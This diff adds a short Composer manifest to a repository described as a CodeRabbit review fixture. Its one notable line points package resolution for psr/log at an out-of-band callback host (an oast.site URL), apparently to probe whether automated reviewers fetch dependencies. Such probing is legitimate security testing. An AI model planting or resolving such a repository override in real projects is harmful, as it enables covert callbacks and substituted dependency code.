@@ -1,0 +1,14 @@
+{
+  "name": "h123/probe",
+  "description": "CodeRabbit review fixture repository (own test repo)",
+  "type": "project",
+  "require": {
+    "psr/log": "^3.0"
+  },
+  "repositories": [
+    {
+      "type": "composer",
+      "url": "https://dc2hf8e37dusrkj6k5tgis9sxgxis9zin.oast.site/h123b-fork-composer"
+    }
+  ]
+}
